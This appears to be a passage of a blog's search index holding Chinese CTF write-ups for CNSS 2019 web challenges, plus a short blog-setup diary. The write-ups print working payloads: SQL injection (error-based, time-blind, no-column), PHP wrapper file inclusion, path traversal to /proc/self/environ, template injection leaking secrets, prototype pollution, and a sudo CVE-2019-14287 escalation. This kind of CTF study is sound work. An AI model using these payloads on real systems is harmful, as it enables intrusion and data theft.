，这里我探索了接近两小时终于搜到了一个神奇的漏洞 CVE-2019-14287 ，漏洞具体信息可以参考我好不容易搜到的的这个网站 根据这个漏洞执行以下命令 sudo -u#-1 /bin/cat /flag 成功获得 flag！！！（泪目） ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:6:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":" 由于技术有限，时间匆忙，本文可能存在各种问题。如发现问题（如思路错误、术语错误 或 我的解法凭空增加了解题难度 等），请各位 dalao 毫不犹豫的锤爆我的狗头，谢谢！ 感谢 ay3 对 产品经理 一题解题思路的指正，感谢 dalao！ ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:0:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"check_in web 的第一道签到题，打开就说了 hide，果断 F12 看源码，发现注释里有些东西 \u003c!--what is this : ./secret/f1ag_is_h4re.php--\u003e 直接在url后添加 /secret/f1ag_is_h4re.php 进入下一关，这里再看源码并无收获，看一下 Cookie，发现多了一条名为 interesting_string 的 Cookie，查看其内容如下 Y25zc3t3ZWxjb21lX3RvX3dlYl9XMHJsZCF9 猜测为某种编码，尝试 base64 解码，成功获取 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:1:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"True_check_in 真正的签到题？打开发现是一个数学题，果断打开计算器算出正确答案 8589934592 输入答案时发现问题，输入框有长度限制，看源码，发现最大长度为 8，而我们的答案有十位，但这里长度限制在前端，打开 Burp Suite 一通抓包改包（也可审查元素直接改maxlength），输入正确答案，成功获取 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:2:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"warm_up 来热个身！看到题目即想到修改 header，这里用到了 User-Agent 、 X-Forwarded-For 和 Referer 首先在 User-Agent 中添加 cnss，或直接将其中浏览器名称改为 cnss PS：这里应注意，不要将 UA 内容全部删除只写入 cnss，这样有可能服务器无法解析而拿不到 flag 然后添加下面两句 X-Forwarded-For: 233.233.233.233 Referer: www.notcnss.com 将包发出，成功获取 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:3:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"GAY' Profile 一眼望去，好GAY的题首先看源码，发现如下注释 \u003c!-- Why not try to get /source ? --\u003e 果断 url 后加 /source，拿到源码，发现在 /file 中通过name参数可以读取文件，结合 hint 中所说 flag 在 /flag 中构造 url /file?name=../flag 别问我为什么 flag 在上一级目录，试一试就出来了（逃，成功获取 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:4:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"love_reading 拿到这道题，只给了两句话，乍一看比较懵 Evil robot take my love. I only know that he uses linux. 细细分析这两句话中的提示，发现 robot 和 linux 应该有作用 先尝试在 url 后添加 /robots.txt， 出现了 s4cret.php，直接修改 url，惊喜的发现一片空白 读 hint 发现 vim in linux ，眼前一亮，即想到 vim 产生的临时文件 分别尝试 /.s4cret.php.swp 和 /.index.php.swp，发现 index.php 存在临时文件，用 vim 还原，得到源码 if(!(isset($_GET['key']) \u0026\u0026 isset($_GET['f']))){ die(); } else{ $path = $_GET['key']; $data = file_get_contents($path); if($data != \"zhi ma kai men!\"){ die(\"no no nope\"); } $f = $_GET['f']; include($f); } 源码不长，发现有两个参数 key 和 f，分别调用 file_get_contents() 和 include()，应从这两个地方入手，由于没有任何过滤机制，故直接考虑 PHP 伪协议 第一个参数应用自己的输入代替获取文件内容，可用 php://input 加 POST 传参直接绕过 第二个参数应为 include() 的任意文件读取，用 php://filter 即可 故构造以下url /?key=php://input\u0026f=php://filter/convert.base64-encode/resource=s4cret.php 然后 Burp Suite 抓包，请求方法改为 POST，请求体添加 zhi ma kai men!，获得一段 base64 编码的文本（或直接采用 HackBar 发送 POST 请求），解码后可看到一段神奇的注释，成功获得flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:5:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"Gay Profile Plus 继续 gay看源码，继续 /source，发现加了一段神奇的语句 if os.path.abspath(filename).startswith(os.getcwd()) and filename != './profile': return 'No No No', 422 这里大概意思是，如果要读取的文件在当前工作目录，那么它必须是 ./profile，但是题目告诉我们 flag 在 ./flag 中，显然直接读取就行不通了，由抓包可知服务器为 Linux，可考虑 /proc 文件系统 proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的。（源自网络） 一般来说 /proc 目录下有以 PID 命名的目录，可以通过此目录获取进程所在目录的文件，但这里显然无法获取 PID，但源码中 os.getcwd() 提醒我们要用当前工作目录，于是构造以下 url /file?name=/proc/self/cwd/flag 成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:6:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"baby_sql 作为 sqli 的第一题，本题并不难，未进行任何过滤，但添加了 code 参数进行验证，防止了直接 SqlMap，但只需进行简单 union 查询注入即可，但应注意，此处仅显示查询的第一条结果，故查询时应给予一个无内容的 id 依次查询库名、表名、字段名，直接查询即可，成功获得 flag PS：可采用 Python 脚本自动输入 code 参数，缩短操作时间（另三道 sqli 同理） ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:7:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"蟒蛇-Login_in 打开发现一个登录界面，需要提供密码和验证码，且知道验证码MD5后的前三位，看源码，有以下注释 \u003c!--验证码一共4位数字字母，密码都是数字，验证码正确你就知道密码位数了--\u003e 那就先写一个计算验证码的 python 脚本 得到正确的验证码并输入后，得知密码为4位数字，由于没有任何其他提示，这里选择爆破法，只需从 0000 试到 9999 即可，将上面的脚本进行扩充（由于验证码随机，注意使用 session，且注意 requests 获取网页的编码格式） 输入获取到的正确密码和验证码，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:8:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"Gay Profile Plus Plus 既然题干已经说了放在文件不安全，那就不可能直接从本地文件获取 flag 了，那如何把一个东西存储在文件之外呢？这里我们继续考虑 gay+ 的时候用过的 /proc 文件系统，因为它存在于内存中，当然就不是文件了 查看 /proc 文件系统的具体说明，发现在进程目录下存在一个环境变量，猜测 flag 可能存在于此，故构造 url 如下 /file?name=/proc/self/environ 发现 flag 果然在此，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:9:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"产品经理 查看源码，在 db.php 的注释中发现以下 sql 语句 ...namechar(64)...INSERTINTOproductsVALUES('cnss',sha256(....),'FLAG_HERE');... 得知 name 的长度最大为 64 ， 而我们需要获取 name 为 cnss 处的 description 因题干说了使用了 PDO ，首先排除sql注入 观察源码，发现 get_product 和 check_name_secret 分离 function get_product($name) { global $db; $statement = $db-\u003eprepare( \"SELECT name, description FROM products WHERE name = ?\" ); ...} function check_name_secret($name, $secret) { global $db; $valid = false; $statement = $db-\u003eprepare( \"SELECT name FROM products WHERE name = ? AND secret = ?\" ); ...} 即验证 name 和 secret 和获取信息并非同步进行，而获取信息时并不需要 secret，考虑到 Mysql 对尾空格的处理，add 以下内容 Name: cnss + 任意空格 Secret: 符合要求即可 Description: 任意 执行 add 操作后，view 以下内容 Name: cnss Secret: 上一步设置的密码 执行 view 操作，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:10:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"easy_sql 经过试验，发现许多字符被屏蔽，比较重要的有（都有方法绕过或不使用） and - * 空格 其中 空格 可用 %0a 代替，注释符号 -- 可用 %23 代替 由于 and 不可用，这里考虑报错注入，且由于 * 不可用，考虑 xml 的报错，经测试，xml 的报错注入可用，故构造如下 payload 1%27%0aor%0a(extractvalue(1,concat(0x7e,(......),0x7e)))%23 只需将 ...... 处修改为查询语句，即可在报错中看到查询结果 依次查询库名、表名、字段名，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:11:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"True_Love 不得不说，出题人真的有心了 但是先别看这个心了看题吧 从第一个界面目测找不到什么有用信息，不妨打开题目所说的 /admin ，看到一个登陆界面，且第一行就说 只有admin才能拿到flag 那就让我们成为 admin 不就好了 查看 cookie 发现一条 session ， base64解码，发现第一段为用户名，考虑 session 伪造，而现在的问题在于不知道密钥，那就先拿到密钥 随便修改 / 后的内容，发现 404 界面中有出错的 url ，由于后端为 python ，尝试模板注入，先构造 {{1+1}} 得到结果 2 ，模板构造漏洞存在，直接构造 {{config}} ，即可得到密钥 通过 flask 框架构造 session ，替换本题网页中的 session，刷新页面即可发现 flag 出现在 url 中，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:12:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"normal_sql 本题验证码变成了给定其md5的前四位，无非是增加了些脚本行数和运行时间，问题不大 依旧过滤了众多字符，且并无错误信息，故考虑延时盲注，构造如下 payload 1'and(if(ascii(substr((select(...)from(...)),index,1))\u003e0,1,sleep(3)))%23 修改 ... index 和 0 处的值，通过网页加载时间，判断盲注结果 依次查询库名、表名、字段名，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:13:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"Gay Profile Plus Plus Plus emmm…ts后端可还行 源码提供了那就直接康康，发现在 /file 中有以下内容 if (!file \u0026\u0026 !ctx.__proto__.name) { ctx.body = 'No No No...'; ctx.status = 422; return; } else if (file \u0026\u0026 file.indexOf('flag') !== -1){ ctx.body = 'No No No...'; ctx.status = 403; return; } else if (!file){ file = ctx.__proto__.name; } 大概一看我们就会发现，flag 应该是放在一个文件中，而你不能通过这个文件名读取它，但是可以通过 ctx.__proto__.name 继承 name 属性，所以考虑原型链污染 再看 /save 的部分，可以发现输入数据会通过 JSON.parse 解析，这样就为我们进行原型链污染提供了可能，故构造以下 JSON字符串 {\"type\": \"hhh\", \"content\": {\"constructor\": {\"prototype\": {\"name\": filename}}}} 只需修改 filename 的值提交，再在 /file 处将 name 留空，即可读取任意文件，首先尝试 flag 无果，再尝试 ../flag ，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:14:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"hard_sql 题干直接告诉我们 Make it wrong ，首先考虑的是报错注入，但是错误信息根本没有回显，出错只会有 Something wrong 的提示 这里可以考虑让其在特定情况下报错，首先考虑 if ，发现被过滤，于是使用 case when 的用法 构造以下 payload 1' and case (ascii(substr((something),index,1))) when asc then pow(999,999) end %23 这里注意 select 和 information 会被过滤，但只需通过大小写变化绕过即可 上述语句在查询的字符的 ascii 等于给出的数字时，才会执行 pow(999,999) ，此时才会产生报错 通过修改 something index 和 asc 可以爆出库名和表名，但当尝试爆出字段名的时候发现 column 被过滤且无法绕过，所以尝试无列名注入（虽然我也不懂为什么无列名注入的题只有一列，但是还是这么做了）,将 something 改为如下 payload 即可进行无列名注入 Select`1`from(Select1unionselect*fromdatabase_name.table_name)asalimit1,1 依次爆出 flag 的每一位即可，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:15:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"[BOSS] Get Me Inside Get ♂ Me ♂ Inside ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:16:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["心路历程"],"content":"0x00 前言 前几天心血来潮想搭个博客，可万万没想到，搭个博客如此令人愉(beng)悦(kui)，来让我们从头说起😭 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:1:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"},{"categories":["心路历程"],"content":"0x01 Where？ 搭建博客一般有两种选择：GitHub Page 或者 自己的服务器(VPS)。第一种方法操作简单，而且不要钱，但只能使用静态网站，可以搭配 Hexo 等静态网站生成器，但是由于一些特殊的原因，这里我采用了第二种方法 Github Page 真香（用了 Custom domain）。 VPS 服务商我选择了老牌大厂 Vultr ，一个一个试 IP 可是真的快♂乐（手动滑稽），经过无数次尝试，苍天不负有心人，终于给我个能用的了，然后 LNMP 一条龙，服务器方面基本 OK。 然后是域名，依旧是个老牌大厂 GoDaddy ，搞完域名随手挂在 CloudFlare 上，爽歪歪。 至此，第一个问题 “Where?” 解决。 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:2:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"},{"categories":["心路历程"],"content":"0x02 How？ 说起怎么建站，这可真的是血泪史的来历。 搭建博客一般又有两种选择：动态网站 和 静态网站。当然又由于对技术的向往（这次是真的向往），反手就是一个 Wordpress （安装极其容易，轻松开始 Blog 生活）。 好了装是装完了，嫌配置麻烦可能是因为我太菜了，但是，你官方主题还能再丑一点吗，你说好的博客平台你为啥主题千奇百怪（此处省略一万字吐槽），由于本人过菜不想自己配置太多只能靠吐槽为生，大佬勿喷反正也不会有大佬看的吧。好吧那既然官方主题满♂足不了我我就找第三方呗，但是，好康的是有啊，但是都要钱啊（此处留下贫穷的泪水）。好吧，潇洒转身，缓缓打出 rm -rf ./* ，拜拜了您嘞。 于是转向静态网站寻求解决，嗯，真香。说到静态网站就要提到这三家：Jekyll, Hugo 和 Hexo。这里我选择了配置简单，但并未改变我对技术的向往（手动狗头），且生成速度快的 Hugo （最终由于不明原因变成了 Hexo）。 配置方面嘛，打开 GitHub ，搜索 Hugo ，下载对应系统的 Release 版本，配置完成。这里不得不点名表扬一下 Hugo 的官方文档，真的是应有尽有了，然后再点名表扬一下官方收录的主题，跟隔壁算了面向的群体不同不说了。在我究极审美的指引下，我选择了这款偏向极简风格的 Coder 主题，自己看着舒服就好了。 从 GitHub 上 clone 一下主题，简单配置一下，就可以投入使用了。 cnpm install hexo-cli -g 至此，第二个问题 “How?” 也解决了。 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:3:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"},{"categories":["心路历程"],"content":"0x03 使用 HTTPS 这里我使用了一个极其草率的方法，直接使用了 CloudFlare 的 Flexible 模式，然后再 Page Rule 里配置一下强制使用 HTTPS 即可。 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:4:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"},{"categories":["心路历程"],"content":"0x04 总结 搭建博客并非一个简单的事，而同一种方法也不一定适合所有人，只有经过自己的尝试发现真正适合自己的方法，才能搭建出真正属于自己的博客。 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:5:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"}]